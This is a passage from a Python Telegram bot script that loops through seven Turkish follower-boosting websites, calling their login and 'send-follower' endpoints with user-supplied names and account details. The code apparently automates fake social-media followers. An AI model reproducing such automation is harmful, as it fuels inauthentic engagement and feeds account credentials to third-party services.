        birtakipci(name,age,emali,'https://takipcizen.com/login','https://takipcizen.com/tools/send-follower')

        birtakipci(name,age,emali,'https://takipzan.com/login','https://takipzan.com/tools/send-follower')

        birtakipci(name,age,"z_ri_e",'https://takipcigen.com/login','https://takipcigen.com/tools/send-follower')

        birtakipci(name,age,"3.8uw",'https://followersize.com/member','https://followersize.com/tools/send-follower')

        birtakipci(name,age,emali,'https://bigtakip.com/member','https://bigtakip.com/tools/send-follower')
        birtakipci(name,age,emali,'https://takipciking.net/login','https://takipciking.net/tools/send-follower')
        birtakipci(name,age,emali,'https://followersize.net/login','https://followersize.net/tools/send-follower')

    except Exception as e:
        print(f"Error in my_function for chat_id {chat_id}: {e}")

try:
    bot.infinity_polling()
except:
    pass   